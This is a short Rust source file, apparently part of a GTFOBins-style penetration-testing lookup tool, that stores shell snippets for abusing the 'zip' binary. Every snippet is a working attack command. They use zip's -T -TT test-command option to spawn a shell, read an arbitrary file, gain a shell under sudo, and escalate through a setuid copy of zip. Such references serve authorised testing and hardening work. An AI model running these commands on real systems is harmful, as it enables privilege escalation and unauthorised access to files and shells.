pub static BIN_NAME: &'static str = "zip";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp -u)
    zip $TF /etc/hosts -T -TT 'sh #'
    rm $TF
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file-to-read
    TF=$(mktemp -u)
    zip $TF $LFILE
    unzip -p $TF
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp -u)
    sudo zip $TF /etc/hosts -T -TT 'sh #'
    sudo rm $TF
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which zip) .

    TF=$(mktemp -u)
    ./zip $TF /etc/hosts -T -TT 'sh #'
    sudo rm $TF
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
